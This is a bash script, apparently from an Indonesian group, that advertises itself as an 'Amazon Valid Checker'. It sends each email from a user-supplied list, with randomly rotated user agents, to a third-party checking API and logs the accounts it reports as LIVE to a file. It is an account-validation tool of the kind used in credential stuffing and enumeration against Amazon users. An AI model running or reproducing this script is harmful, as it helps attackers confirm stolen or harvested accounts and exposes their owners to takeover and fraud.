#!/bin/bash
#Tatsumi-Crew & Arvan Apriyana
header(){
waktu=$(date '+%Y-%m-%d %H:%M:%S')
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
printf "${GREEN}
         ####################################
         ####################################
         #######                      #######
         #######                      #######
         #######                      #######
         ###############      ###############
         ###############      ###############
         ###############      ###############
         ###############      ###############${RED}
         #######    ####      ####    #######
         #######    ####      ####    #######
         #######    ##############    #######
         #######    ##############    #######
         #######                      #######
         ####################################
         ####################################s${NOCOLOR}
         ------------------------------------
                Amazon Valid CheckerS 
               Code By: Arvan Apriyana
                 www.tatsumi-crew.net
         ------------------------------------
"
}
tatsumi(){
    ua=$(cat ua.txt | sort -R | head -1)
    duration=$SECONDS
    SECONDS=0
    url="http://48.nakocoders.org/api/amz/check.php"
    ref="http://48.nakocoders.org/api/amz"
    send=$(curl -s -A "$ua" -e "$ref" -X POST -d "ajax=1&do=check&mailpass=$1%7Cwkwkwkkw&delim=%7C&email=0&bank=0&card=0&info=0" "$url")
    livena=$(echo $send | grep -Po '(?<="msg":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
    if [[ $livena =~ "LIVE" ]]; then
        printf "${GREEN}[LIVE] $1 [$waktu]\n";
        echo "[LIVE] $1 [$waktu]" >> live.txt
        printf "${NORMAL}"
    else
        printf "${RED}[DIE] $1 [$waktu]";
        echo ""
        printf "${NORMAL}"
    fi
}
header
echo ""
echo "List In This Directory : "
ls
echo "Delimeter list -> email"
echo -n "Masukan File List : "
read list
if [ ! -f $list ]; then
    echo "$list No Such File"
exit
fi
if [[ $perSec == '' ]]; then
    read -p "Delay time: " perSecs
    duration=$SECONDS
    echo "[$header] ========= $perSec Please. $(($duration / 3600)) Wait $(($duration / 60)) ========= $(($duration % 60)) "
    sleep $perSec
fi
    x=$(gawk '{ print $1 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailna=($x)'
for (( i = 0; i < "${#emailna[@]}"; i++ )); do
        scanskrngah="${emailna[$i]}"
        tatsumi $scanskrngah
done
